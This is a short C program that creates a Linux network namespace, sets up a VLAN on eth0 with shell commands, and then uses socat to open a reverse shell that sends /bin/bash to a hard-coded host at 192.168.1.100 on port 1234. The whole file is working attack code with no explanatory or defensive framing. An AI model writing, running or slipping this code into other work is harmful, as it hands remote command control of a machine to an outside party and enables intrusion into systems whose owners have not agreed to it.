#include <sched.h>  // For CLONE_NEWNET
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/sched.h> 

extern int unshare(int flags);  // Manually declare unshare()

#define VLAN_ID 100
#define REVERSE_SHELL_IP "192.168.1.100"
#define REVERSE_SHELL_PORT 1234

void error(char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

void create_vlan_in_namespace(const char* vlan_name, int vlan_id, const char* base_interface) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ip link add link %s name %s type vlan id %d", base_interface, vlan_name, vlan_id);
    if (system(cmd) != 0) {
        error("ERROR creating VLAN");
    }
    snprintf(cmd, sizeof(cmd), "ip link set %s up", vlan_name);
    if (system(cmd) != 0) {
        error("ERROR bringing VLAN interface up");
    }
}

void open_reverse_shell() {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "socat TCP:%s:%d EXEC:/bin/bash", REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    if (system(cmd) != 0) {
        error("ERROR opening reverse shell with socat");
    }
}

void create_network_namespace() {
    if (unshare(CLONE_NEWNET) == -1) {
        error("ERROR creating network namespace");
    }
}

int main() {
    const char *vlan_name = "vlan100";
    const char *base_interface = "eth0";

    printf("Creating network namespace...\n");
    create_network_namespace();

    printf("Creating VLAN %d inside namespace...\n", VLAN_ID);
    create_vlan_in_namespace(vlan_name, VLAN_ID, base_interface);

    printf("Opening reverse shell to %s:%d...\n", REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    open_reverse_shell();

    return 0;
}
